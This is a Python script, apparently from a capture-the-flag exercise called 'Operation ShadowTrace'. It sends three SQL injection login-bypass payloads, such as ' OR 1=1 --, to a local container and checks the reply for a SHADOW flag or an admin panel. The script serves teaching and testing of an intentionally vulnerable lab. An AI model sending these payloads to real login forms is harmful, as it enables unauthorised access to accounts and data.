#!/usr/bin/env python3
"""
Operation ShadowTrace - Stage 4 SQL Injection Tester
Member 4 - Integration & Testing
Tests whether the login bypass works via SQL injection.
"""

import requests
import sys

TARGET = "http://localhost:8080/index.php"
PAYLOADS = [
    {"username": "' OR 1=1 --", "password": "test"},
    {"username": "affiliate' --", "password": "test"},
    {"username": "' OR '1'='1", "password": "' OR '1'='1"},
]

def test_sqli():
    print("[*] Stage 4 SQL Injection Tester")
    print(f"[*] Target: {TARGET}")
    print("-" * 40)

    session = requests.Session()

    for i, payload in enumerate(PAYLOADS, 1):
        print(f"[+] Trying payload {i}: {payload['username']}")
        try:
            response = session.post(TARGET, data=payload, timeout=5, allow_redirects=True)
            if "SHADOW{web_" in response.text or "Broker Admin Panel" in response.text:
                print(f"[✓] SUCCESS – SQL Injection works!")
                print(f"[✓] Payload: username = {payload['username']}")
                if "SHADOW{web_" in response.text:
                    # Extract flag if present
                    start = response.text.find("SHADOW{")
                    end = response.text.find("}", start) + 1
                    print(f"[✓] Flag found: {response.text[start:end]}")
                return True
            else:
                print(f"[-] Failed with this payload")
        except requests.exceptions.ConnectionError:
            print("[!] Cannot connect. Is the container running?")
            print("    Run: docker compose up -d")
            return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return False

    print("[!] All payloads failed")
    return False

if __name__ == "__main__":
    success = test_sqli()
    sys.exit(0 if success else 1)